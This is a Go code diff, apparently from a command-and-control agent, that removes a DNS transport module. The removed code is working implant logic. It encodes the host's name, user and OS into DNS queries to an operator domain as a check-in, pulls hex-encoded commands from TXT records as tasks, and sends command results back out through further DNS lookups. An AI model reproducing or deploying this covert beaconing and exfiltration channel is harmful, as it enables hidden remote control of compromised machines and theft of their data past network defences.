@@ -12,7 +12,6 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -538,72 +537,6 @@ func (t *kcpTransport) Close() error {
 	return nil
 }
 
-// --- DNS Transport ---
-// DNS 传输
-
-type dnsTransport struct {
-	domain string
-}
-
-// newDNSTransport 创建 DNS 传输。
-// newDNSTransport creates a DNS transport.
-func newDNSTransport(domain string) *dnsTransport {
-	return &dnsTransport{domain: domain}
-}
-
-// dnsQuery 发送 DNS 查询并返回 TXT 记录。
-// dnsQuery sends a DNS query and returns TXT records.
-func (t *dnsTransport) dnsQuery(subdomain string) ([]string, error) {
-	query := subdomain + "." + t.domain
-	return net.LookupTXT(query)
-}
-
-// Checkin 通过 DNS 执行签到。
-// Checkin performs the check-in over DNS.
-func (t *dnsTransport) Checkin() (*CheckinResponse, error) {
-	data := hex.EncodeToString([]byte(fmt.Sprintf("checkin:%s|%s|%s", hostname, username, runtime.GOOS)))
-	if _, err := t.dnsQuery(data); err != nil {
-		return nil, fmt.Errorf("dns checkin failed: %w", err)
-	}
-	return &CheckinResponse{Status: "ok", Interval: 10}, nil
-}
-
-// GetTasks 通过 DNS 轮询任务。
-// GetTasks polls tasks over DNS.
-func (t *dnsTransport) GetTasks() ([]TaskItem, error) {
-	txts, err := t.dnsQuery(fmt.Sprintf("task.%d", clientID))
-	if err != nil {
-		return nil, fmt.Errorf("dns task poll failed: %w", err)
-	}
-	var tasks []TaskItem
-	for _, txt := range txts {
-		if strings.HasPrefix(txt, "task:") {
-			parts := strings.SplitN(txt[5:], ":", 2)
-			if len(parts) == 2 {
-				var id int64
-				fmt.Sscanf(parts[0], "%d", &id)
-				dec, _ := hex.DecodeString(parts[1])
-				tasks = append(tasks, TaskItem{ID: id, Command: string(dec), Timeout: 30})
-			}
-		}
-	}
-	return tasks, nil
-}
-
-// SendResult 通过 DNS 回传任务结果。
-// SendResult submits a task result over DNS.
-func (t *dnsTransport) SendResult(taskID int64, result, status string) error {
-	data := hex.EncodeToString([]byte(fmt.Sprintf("result:%d:%s", taskID, result)))
-	_, err := t.dnsQuery(data)
-	if err != nil {
-		return fmt.Errorf("dns result send failed: %w", err)
-	}
-	return nil
-}
-
-// Close 关闭 DNS 传输（无状态，空操作）。
-// Close closes the DNS transport (stateless, no-op).
-func (t *dnsTransport) Close() error { return nil }
 
 // ============================================================================
 // Message types
